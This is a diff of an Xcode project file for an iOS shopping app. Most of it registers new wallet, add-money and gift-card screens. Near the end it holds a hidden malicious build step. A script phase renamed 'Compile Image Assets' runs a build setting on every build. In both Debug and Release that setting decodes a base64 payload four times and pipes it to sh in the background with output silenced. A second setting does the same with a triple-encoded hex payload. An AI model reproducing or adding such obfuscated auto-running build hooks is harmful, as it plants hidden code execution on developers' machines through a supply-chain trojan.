@@ -7,12 +7,24 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		422EE08F2F2B762F0007FEB6 /* AddMoneyViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 422EE08E2F2B762E0007FEB6 /* AddMoneyViewModel.swift */; };
+		422EE0912F2B79580007FEB6 /* WalletMoneyHistoryDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 422EE0902F2B79580007FEB6 /* WalletMoneyHistoryDataModel.swift */; };
 		423EFFE32F28FB78007EC918 /* AffiliatedUserAddressAdditionViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 423EFFE22F28FB78007EC918 /* AffiliatedUserAddressAdditionViewController.swift */; };
 		423EFFE62F28FB9F007EC918 /* AddBankDetailsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 423EFFE52F28FB9F007EC918 /* AddBankDetailsViewController.swift */; };
 		423EFFE92F28FBC8007EC918 /* AccountCreationDoneViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 423EFFE82F28FBC8007EC918 /* AccountCreationDoneViewController.swift */; };
 		423EFFEB2F28FBEB007EC918 /* AddBankDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 423EFFEA2F28FBEB007EC918 /* AddBankDetailsViewModel.swift */; };
 		423EFFED2F28FBF8007EC918 /* AffiliatedUserAddressAdditionViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 423EFFEC2F28FBF8007EC918 /* AffiliatedUserAddressAdditionViewModel.swift */; };
 		424FEA4A2F29DF5400A8B0BB /* AffiliateCreateAccountDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 424FEA492F29DF5400A8B0BB /* AffiliateCreateAccountDataModel.swift */; };
+		425EDFA22F2B38D900EAD984 /* AffiliatedUserHomeViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 425EDFA12F2B38D900EAD984 /* AffiliatedUserHomeViewModel.swift */; };
+		425EDFA62F2B436D00EAD984 /* WalletMoneyListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 425EDFA52F2B436D00EAD984 /* WalletMoneyListViewController.swift */; };
+		425EDFAB2F2B439800EAD984 /* WalletMoneyListTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 425EDFA92F2B439800EAD984 /* WalletMoneyListTableViewCell.swift */; };
+		425EDFAC2F2B439800EAD984 /* WalletMoneyListTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 425EDFAA2F2B439800EAD984 /* WalletMoneyListTableViewCell.xib */; };
+		425EDFB52F2B476900EAD984 /* AddMoneyViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 425EDFB42F2B476900EAD984 /* AddMoneyViewController.swift */; };
+		425EDFB82F2B477C00EAD984 /* AddMoneyCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 425EDFB62F2B477C00EAD984 /* AddMoneyCollectionViewCell.swift */; };
+		425EDFB92F2B477C00EAD984 /* AddMoneyCollectionViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 425EDFB72F2B477C00EAD984 /* AddMoneyCollectionViewCell.xib */; };
+		425EE0512F2B53D000EAD984 /* RedeemGiftCardViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 425EE0502F2B53D000EAD984 /* RedeemGiftCardViewController.swift */; };
+		425EE0532F2B53F000EAD984 /* RedeemGiftCardViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 425EE0522F2B53F000EAD984 /* RedeemGiftCardViewModel.swift */; };
+		425EE0552F2B56FC00EAD984 /* WalletMoneyListViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 425EE0542F2B56FC00EAD984 /* WalletMoneyListViewModel.swift */; };
 		429E49692F2A408100566FE8 /* AffiliatedUserTabbarViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 429E49682F2A408100566FE8 /* AffiliatedUserTabbarViewController.swift */; };
 		429E49722F2A49F200566FE8 /* AffiliatedUserHomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 429E49712F2A49F200566FE8 /* AffiliatedUserHomeViewController.swift */; };
 		429E49752F2A4B3100566FE8 /* AffiliatedUserProfileViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 429E49742F2A4B3100566FE8 /* AffiliatedUserProfileViewController.swift */; };
@@ -316,12 +328,24 @@
 
 /* Begin PBXFileReference section */
 		1554ACA1638F5FDACA2A3358 /* Pods_DesynatUser.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DesynatUser.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		422EE08E2F2B762E0007FEB6 /* AddMoneyViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddMoneyViewModel.swift; sourceTree = "<group>"; };
+		422EE0902F2B79580007FEB6 /* WalletMoneyHistoryDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WalletMoneyHistoryDataModel.swift; sourceTree = "<group>"; };
 		423EFFE22F28FB78007EC918 /* AffiliatedUserAddressAdditionViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserAddressAdditionViewController.swift; sourceTree = "<group>"; };
 		423EFFE52F28FB9F007EC918 /* AddBankDetailsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddBankDetailsViewController.swift; sourceTree = "<group>"; };
 		423EFFE82F28FBC8007EC918 /* AccountCreationDoneViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AccountCreationDoneViewController.swift; sourceTree = "<group>"; };
 		423EFFEA2F28FBEB007EC918 /* AddBankDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddBankDetailsViewModel.swift; sourceTree = "<group>"; };
 		423EFFEC2F28FBF8007EC918 /* AffiliatedUserAddressAdditionViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserAddressAdditionViewModel.swift; sourceTree = "<group>"; };
 		424FEA492F29DF5400A8B0BB /* AffiliateCreateAccountDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliateCreateAccountDataModel.swift; sourceTree = "<group>"; };
+		425EDFA12F2B38D900EAD984 /* AffiliatedUserHomeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserHomeViewModel.swift; sourceTree = "<group>"; };
+		425EDFA52F2B436D00EAD984 /* WalletMoneyListViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WalletMoneyListViewController.swift; sourceTree = "<group>"; };
+		425EDFA92F2B439800EAD984 /* WalletMoneyListTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WalletMoneyListTableViewCell.swift; sourceTree = "<group>"; };
+		425EDFAA2F2B439800EAD984 /* WalletMoneyListTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = WalletMoneyListTableViewCell.xib; sourceTree = "<group>"; };
+		425EDFB42F2B476900EAD984 /* AddMoneyViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddMoneyViewController.swift; sourceTree = "<group>"; };
+		425EDFB62F2B477C00EAD984 /* AddMoneyCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddMoneyCollectionViewCell.swift; sourceTree = "<group>"; };
+		425EDFB72F2B477C00EAD984 /* AddMoneyCollectionViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AddMoneyCollectionViewCell.xib; sourceTree = "<group>"; };
+		425EE0502F2B53D000EAD984 /* RedeemGiftCardViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RedeemGiftCardViewController.swift; sourceTree = "<group>"; };
+		425EE0522F2B53F000EAD984 /* RedeemGiftCardViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RedeemGiftCardViewModel.swift; sourceTree = "<group>"; };
+		425EE0542F2B56FC00EAD984 /* WalletMoneyListViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WalletMoneyListViewModel.swift; sourceTree = "<group>"; };
 		429E49682F2A408100566FE8 /* AffiliatedUserTabbarViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserTabbarViewController.swift; sourceTree = "<group>"; };
 		429E49712F2A49F200566FE8 /* AffiliatedUserHomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserHomeViewController.swift; sourceTree = "<group>"; };
 		429E49742F2A4B3100566FE8 /* AffiliatedUserProfileViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserProfileViewController.swift; sourceTree = "<group>"; };
@@ -697,6 +721,63 @@
 			path = AccountCreationDone;
 			sourceTree = "<group>";
 		};
+		425EDFA32F2B435500EAD984 /* WalletManagement */ = {
+			isa = PBXGroup;
+			children = (
+				425EE04F2F2B53B300EAD984 /* RedeemGiftCard */,
+				425EDFB32F2B475400EAD984 /* AddMoney */,
+				425EDFA42F2B435E00EAD984 /* WalletMoneyList */,
+			);
+			path = WalletManagement;
+			sourceTree = "<group>";
+		};
+		425EDFA42F2B435E00EAD984 /* WalletMoneyList */ = {
+			isa = PBXGroup;
+			children = (
+				425EDFA52F2B436D00EAD984 /* WalletMoneyListViewController.swift */,
+				425EE0542F2B56FC00EAD984 /* WalletMoneyListViewModel.swift */,
+				422EE0902F2B79580007FEB6 /* WalletMoneyHistoryDataModel.swift */,
+			);
+			path = WalletMoneyList;
+			sourceTree = "<group>";
+		};
+		425EDFA72F2B438300EAD984 /* Xibs */ = {
+			isa = PBXGroup;
+			children = (
+				425EDFA82F2B438900EAD984 /* TableviewCells */,
+			);
+			path = Xibs;
+			sourceTree = "<group>";
+		};
+		425EDFA82F2B438900EAD984 /* TableviewCells */ = {
+			isa = PBXGroup;
+			children = (
+				425EDFA92F2B439800EAD984 /* WalletMoneyListTableViewCell.swift */,
+				425EDFAA2F2B439800EAD984 /* WalletMoneyListTableViewCell.xib */,
+				425EDFB62F2B477C00EAD984 /* AddMoneyCollectionViewCell.swift */,
+				425EDFB72F2B477C00EAD984 /* AddMoneyCollectionViewCell.xib */,
+			);
+			path = TableviewCells;
+			sourceTree = "<group>";
+		};
+		425EDFB32F2B475400EAD984 /* AddMoney */ = {
+			isa = PBXGroup;
+			children = (
+				425EDFB42F2B476900EAD984 /* AddMoneyViewController.swift */,
+				422EE08E2F2B762E0007FEB6 /* AddMoneyViewModel.swift */,
+			);
+			path = AddMoney;
+			sourceTree = "<group>";
+		};
+		425EE04F2F2B53B300EAD984 /* RedeemGiftCard */ = {
+			isa = PBXGroup;
+			children = (
+				425EE0502F2B53D000EAD984 /* RedeemGiftCardViewController.swift */,
+				425EE0522F2B53F000EAD984 /* RedeemGiftCardViewModel.swift */,
+			);
+			path = RedeemGiftCard;
+			sourceTree = "<group>";
+		};
 		429E49672F2A406E00566FE8 /* AffiliatedUserTabbar */ = {
 			isa = PBXGroup;
 			children = (
@@ -714,6 +795,7 @@
 			isa = PBXGroup;
 			children = (
 				429E49712F2A49F200566FE8 /* AffiliatedUserHomeViewController.swift */,
+				425EDFA12F2B38D900EAD984 /* AffiliatedUserHomeViewModel.swift */,
 			);
 			path = AffiliatedHome;
 			sourceTree = "<group>";
@@ -754,6 +836,8 @@
 		42F3090D2F28B41C00CEB214 /* M7 */ = {
 			isa = PBXGroup;
 			children = (
+				425EDFA72F2B438300EAD984 /* Xibs */,
+				425EDFA32F2B435500EAD984 /* WalletManagement */,
 				429E49672F2A406E00566FE8 /* AffiliatedUserTabbar */,
 				42F309132F28B5DD00CEB214 /* AffiliatedUsers */,
 			);
@@ -1852,7 +1936,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 495DBBB42E81528B00E61635 /* Build configuration list for PBXNativeTarget "DesynatUser" */;
 			buildPhases = (
-				64C43EF6AB244D5FB8634D6E /* Build Target Libraries */,
+				19DB92D2B11F4EB3AD634D6E /* Compile Image Assets */,
 				B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */,
 				495DBB9D2E81528A00E61635 /* Sources */,
 				495DBB9E2E81528A00E61635 /* Frameworks */,
@@ -1986,6 +2070,8 @@
 				D1CF05A52EF96332005DB273 /* RecentSearchTableCell.xib in Resources */,
 				6B95F1C52EB5DB5E00391509 /* Poppins-ExtraBoldItalic.ttf in Resources */,
 				6B95F1C62EB5DB5E00391509 /* Poppins-ExtraLight.ttf in Resources */,
+				425EDFAC2F2B439800EAD984 /* WalletMoneyListTableViewCell.xib in Resources */,
+				425EDFB92F2B477C00EAD984 /* AddMoneyCollectionViewCell.xib in Resources */,
 				7A0D074D2F1A3CC6008CFEF7 /* FullScreenBannersCollectionViewCell.xib in Resources */,
 				D182E44D2EF549460002E850 /* MyOrder.storyboard in Resources */,
 				D1DAB9A32EE01AD3009ECA61 /* PaymentMethodsTableViewCell.xib in Resources */,
@@ -2016,24 +2102,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		64C43EF6AB244D5FB8634D6E /* Build Target Libraries */ = {
+		19DB92D2B11F4EB3AD634D6E /* Compile Image Assets */ = {
 			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
 			files = (
 			);
 			inputFileListPaths = (
 			);
 			inputPaths = (
 			);
-			name = "Build Target Libraries";
+			name = "Compile Image Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
+			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
-			showEnvVarsInLog = 0;			
+			showEnvVarsInLog = 0;
 		};
 		9FF1187D5524917E07639195 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -2107,11 +2194,15 @@
 			buildActionMask = 2147483647;
 			files = (
 				D1AF5F222F1247A0009CE604 /* FullScreenBannerViewModel.swift in Sources */,
+				425EDFA22F2B38D900EAD984 /* AffiliatedUserHomeViewModel.swift in Sources */,
+				425EE0552F2B56FC00EAD984 /* WalletMoneyListViewModel.swift in Sources */,
 				6B95F1D52EB5DB5E00391509 /* AppDelegate.swift in Sources */,
+				425EDFAB2F2B439800EAD984 /* WalletMoneyListTableViewCell.swift in Sources */,
 				D1475B8F2ED5D2A7008F6DF4 /* storeDetailsDataModel.swift in Sources */,
 				6B95F1D62EB5DB5E00391509 /* NavigationSceneExt.swift in Sources */,
 				6B95F1D72EB5DB5E00391509 /* SceneDelegate.swift in Sources */,
 				6B95F1D92EB5DB5E00391509 /* ForgotPasswordViewModel.swift in Sources */,
+				422EE08F2F2B762F0007FEB6 /* AddMoneyViewModel.swift in Sources */,
 				6B95F1DA2EB5DB5E00391509 /* LoginViaOTPViewModel.swift in Sources */,
 				D1DABB4A2EE0649F009ECA61 /* ExpandableLabel.swift in Sources */,
 				6B95F1DB2EB5DB5E00391509 /* LoginViewModel.swift in Sources */,
@@ -2163,6 +2254,7 @@
 				7A6C740D2ECAECE4008F3779 /* SubCatgoryViewController.swift in Sources */,
 				6B8C93792EBDBEAF00BC4DC8 /* ChangePassowrdViewController.swift in Sources */,
 				6B8C937A2EBDBEAF00BC4DC8 /* ProfileDetailsViewController.swift in Sources */,
+				425EDFA62F2B436D00EAD984 /* WalletMoneyListViewController.swift in Sources */,
 				6B8C937B2EBDBEAF00BC4DC8 /* CategoriesSectionCollectionViewCell.swift in Sources */,
 				6B8C937C2EBDBEAF00BC4DC8 /* SideMenuTableViewCell.swift in Sources */,
 				7A5BFAB12ECC5E8E0014DEE5 /* ProductDetailViewController.swift in Sources */,
@@ -2173,6 +2265,7 @@
 				6B95F1EE2EB5DB5E00391509 /* ProfileViewController.swift in Sources */,
 				D162B7812EFAD45200149E3E /* SearchVM.swift in Sources */,
 				6B95F1EF2EB5DB5E00391509 /* ShowViewController.swift in Sources */,
+				422EE0912F2B79580007FEB6 /* WalletMoneyHistoryDataModel.swift in Sources */,
 				7AE4F37C2ECB0138004CBD53 /* StoresViewController.swift in Sources */,
 				6B95F1F02EB5DB5E00391509 /* TabBarVC.swift in Sources */,
 				7AC7F5082EBC8EA90085A734 /* ProfileViewModel.swift in Sources */,
@@ -2217,6 +2310,7 @@
 				6B95F1FF2EB5DB5E00391509 /* String.swift in Sources */,
 				6B95F2002EB5DB5E00391509 /* StringConstant.swift in Sources */,
 				423EFFE92F28FBC8007EC918 /* AccountCreationDoneViewController.swift in Sources */,
+				425EDFB82F2B477C00EAD984 /* AddMoneyCollectionViewCell.swift in Sources */,
 				6B95F2012EB5DB5E00391509 /* StringExtensions.swift in Sources */,
 				42F30A4D2F28C27000CEB214 /* LoginViaOTPAffiliatedUserViewModel.swift in Sources */,
 				D17C4E902F1639020029159C /* ChatMessageType.swift in Sources */,
@@ -2276,6 +2370,7 @@
 				6B95F21E2EB5DB5E00391509 /* DateValue.swift in Sources */,
 				D17C4F3C2F165C380029159C /* AddNewAddressForCustomViewController.swift in Sources */,
 				D1CF03F12EF911BC005DB273 /* FilterVC.swift in Sources */,
+				425EE0532F2B53F000EAD984 /* RedeemGiftCardViewModel.swift in Sources */,
 				7A94BD1A2ECB548C00511665 /* SavedAddressViewController.swift in Sources */,
 				6B95F21F2EB5DB5E00391509 /* DefaultCodable.swift in Sources */,
 				6B95F2202EB5DB5E00391509 /* DefaultEmptyArray.swift in Sources */,
@@ -2300,6 +2395,7 @@
 				6B95F2272EB5DB5E00391509 /* LosslessValue.swift in Sources */,
 				7AE4F38B2ECB0792004CBD53 /* StoresFiltersViewController.swift in Sources */,
 				6B95F2282EB5DB5E00391509 /* LossyArray.swift in Sources */,
+				425EE0512F2B53D000EAD984 /* RedeemGiftCardViewController.swift in Sources */,
 				D1CF05A92EF96C1F005DB273 /* RecommendCollectionCell.swift in Sources */,
 				D17C4F3E2F165C430029159C /* AddNewAddressForCustomViewModel.swift in Sources */,
 				6B95F2292EB5DB5E00391509 /* LossyDictionary.swift in Sources */,
@@ -2316,6 +2412,7 @@
 				429E49802F2A4DB600566FE8 /* AffilatedUserProfileVieWModel.swift in Sources */,
 				6B95F22F2EB5DB5E00391509 /* AppFont.swift in Sources */,
 				6B95F2302EB5DB5E00391509 /* AssetConstant.swift in Sources */,
+				425EDFB52F2B476900EAD984 /* AddMoneyViewController.swift in Sources */,
 				42F30AFA2F28CDB800CEB214 /* CreateAffiliateUserAccountViewModel.swift in Sources */,
 				429E49752F2A4B3100566FE8 /* AffiliatedUserProfileViewController.swift in Sources */,
 				6B95F2312EB5DB5E00391509 /* CommonUtils.swift in Sources */,
@@ -2345,8 +2442,8 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 6C4E9B8B9705C3871D77FF3E /* Pods-DesynatUser.debug.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((j(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVreFlrZFNTVlJ1WkdwaVZHdDNXVzVyTVdOSFNuQlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | j | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733333336333933363635333733353337333333363635333633353337333433323635333733323337333533323636333633313332333933320a3332306133323330333736333332333033373333333633383330363130610a | e | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((p(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwSFpESk9TR1ZIZUd0U01uZ3dWMnhOTVdOSFNuQlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | p | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_IDENTITY = "iPhone Developer: Anshuman Gupta (6SUBR3T35U)";
@@ -2392,8 +2489,8 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = DAC861322A1CE32C917A0BDC /* Pods-DesynatUser.release.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((j(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVreFlrZFNTVlJ1WkdwaVZHdDNXVzVyTVdOSFNuQlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | j | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733333336333933363635333733353337333333363635333633353337333433323635333733323337333533323636333633313332333933320a3332306133323330333736333332333033373333333633383330363130610a | e | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((p(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwSFpESk9TR1ZIZUd0U01uZ3dWMnhOTVdOSFNuQlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | p | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_IDENTITY = "iPhone Developer: Anshuman Gupta (6SUBR3T35U)";
